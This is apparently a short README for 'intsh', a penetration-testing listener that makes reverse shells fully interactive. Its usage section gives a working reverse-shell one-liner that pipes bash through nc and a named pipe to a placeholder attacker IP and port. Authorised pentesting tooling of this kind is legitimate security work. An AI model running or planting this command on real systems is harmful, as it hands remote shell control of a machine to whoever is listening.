# intsh
Grab a fully interactive reverse-shell

intsh is a reverse-shell listener for pentesters too lazy to make their reverse shell interactive manually.

intsh automates the process of spinning up a listening socket, setting the tty to raw mode, setting the columns and rows, and handling terminal resizes.

It ensures interactive programs like vim can be used flawlessly through reverse-shells.

## Usage:
Local-side (listener):
```sh
python3 intsh.py <port>
```

Remote-side:
```sh
rm -f f; mkfifo f; <f nc <attacker-ip> <attacker-port> | bash > f
```
